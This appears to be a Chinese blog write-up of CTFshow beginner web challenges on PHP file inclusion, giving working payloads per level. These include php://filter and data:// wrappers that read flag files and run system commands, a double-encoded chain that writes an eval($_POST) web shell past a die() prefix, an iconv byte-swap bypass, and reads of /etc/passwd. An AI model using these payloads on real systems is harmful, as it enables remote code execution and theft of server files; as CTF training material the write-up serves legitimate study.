---
title: CTFshow_web入门_文件包含
date: 2020-10-11 16:21:46
categories: web入门
---

CTFshow_web入门_文件包含

<!--more-->

![](http://img.npfs06.top/20210226200957.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

## web 78

payload:?file=php://filter/read=convert.base64-encode/resource=flag.php



## web 79

payload: ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=



## web 80-81

关于日志文件包含的知识点这个文章里已经写的很详细了<a href='http://npfs06.top/2020/07/04/日志文件包含' target='_blank'>日志文件包含</a>

可能要多发包几次

![](http://img.npfs06.top/20210226161849.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



![](http://img.npfs06.top/20210226161903.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)





## web 82-86

解法单独写了一篇文章：<a href='http://npfs06.top/2020/10/11/利用PHP-SESSION-UPLOAD-PROGRESS进行文件包含' target="_blank">利用PHP-SESSION-UPLOAD-PROGRESS进行文件包含</a>

 

## web 87

P神文章奉上：<a href='https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list' target="_blank">谈一谈php://filter的妙用</a>

```php
<?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);

    
}else{
    highlight_file(__FILE__);
}
```

先分析一下这个代码，主要就是说过滤了php、data、: 、. ,然后将content参数的值写入到file参数所定义的文件里，但是一同写入的还有<?php die('大佬别秀了');?>，在开头增加了die的过程，导致即使我们成功写入一句话，也执行不了

我们所要做的就是绕过die ，从而执行我们写入的一句话，如何绕或在P神的文章里写了很详细了，总共有三种方法，不过我在这个题目，尝试这三种方法，但只有一种成功。可能是因为版本原因或是别的....，导致另外两种方法执行失败

我用的是base64-decode的解法

```

将 php://filter/read=convert.base64-encode/resource=123.php 进行两次url编码，得到如下

%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%32%25%36%35%25%36%31%25%36%34%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%35%25%36%45%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%33%32%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30%0D%0A

```

然后再content写入经过base64编码过后的一句话 （PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==）

![](http://img.npfs06.top/20210226161925.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



之后来到123.php页面，命令执行即可

![](http://img.npfs06.top/20210226161937.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## web 88

payload:?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4

即 ?file=data://text/plain;base64,<?php system('cat fl0g.php');?>



## web116

hint: misc+lfi

既然提示了misc,那就按照misc的常见解法，把视频下载下来，binwalk 分离试下，得到一张Png图片。图片内容如下：

![](http://img.npfs06.top/20210226162658.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



尝试

> ?file=/etc/passwd

把视频下载下来，notepad++打开发现确实是/etc/passwd文件内容，知道了思路，接下去就简单了

payload:

> ?file=compress.zlib:///var/www/html/flag.php 
>
> ?file=flag.php



## web117

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
function filter($x){
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
        die('too young too simple sometimes naive!');
    }
}
$file=$_GET['file'];
$contents=$_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>".$contents);
```

死亡die绕过

可以使用convert.iconv.*
<a href='https://xz.aliyun.com/t/8163#toc-11' target="_blank">file_put_content和死亡·杂糅代码之缘</a>
原理：对原有字符串进行某种编码然后再解码，这个过程导致最初的限制exit;去除。

构造

```
get:?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
post:contents=?<hp pvela$(P_SO[T]1;)>?
```

